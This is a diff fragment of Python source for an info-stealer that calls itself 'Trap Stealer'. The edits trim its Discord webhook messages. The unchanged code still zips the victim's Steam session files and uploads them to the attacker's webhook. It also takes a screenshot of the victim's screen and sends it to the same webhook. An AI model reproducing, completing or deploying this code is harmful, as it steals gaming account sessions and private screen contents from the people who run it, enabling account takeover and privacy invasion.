@@ -820,7 +820,6 @@ LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 user = os.path.expanduser("~")
 
 def steam_st():
-    steam_path = ""
     if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
         steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
         ssfn = []
@@ -842,32 +841,12 @@ def steam_st():
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                 } 
-            
-            data = {
-            "username": "Trap Stealer",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "embeds": [
-
-                {
-                    "title": "🎮 Trap Stealer Steam Session",
-                    "description": f"Steam session taken at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n",
-                    "color": 0xffb6c1,
-                    "thumbnail": {
-                        "url": "https://cdn.icon-icons.com/icons2/2107/PNG/512/filetype_ico_icon_130108.png"
-                    },
-                    "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                    }
-                }
-            ]
-        }
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
         file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
         data = {
             "username": "Trap Stealer",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "content": "Here the Steam Session file"
         }
 
         response = requests.post(webhook, files=file, data=data)
@@ -890,34 +869,11 @@ def screen():
     img = ImageGrab.grab()
     img_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
     img.save(img_path)
-
-    data = {
-        "username": "Trap Stealer",
-        "content": "",
-        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-        "embeds": [
-            {
-                "title": "🍪 Trap Stealer Screen",
-                "description": f"Screen taken at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n",
-                "color": 0xffb6c1,
-                "thumbnail": {
-                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                },
-                "footer": {
-                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                }
-            }
-        ]
-    }
-
-    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
     file = {"file": open(img_path, "rb")}
 
     data = {
         "username": "Trap Stealer",
-        "content": "",
+        "content": "Screen :",
         "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
     }
 
@@ -938,7 +894,6 @@ else:
 try:
     screen()
 except:
-
     data = {
         "username": "Trap Stealer",
         "content": "",
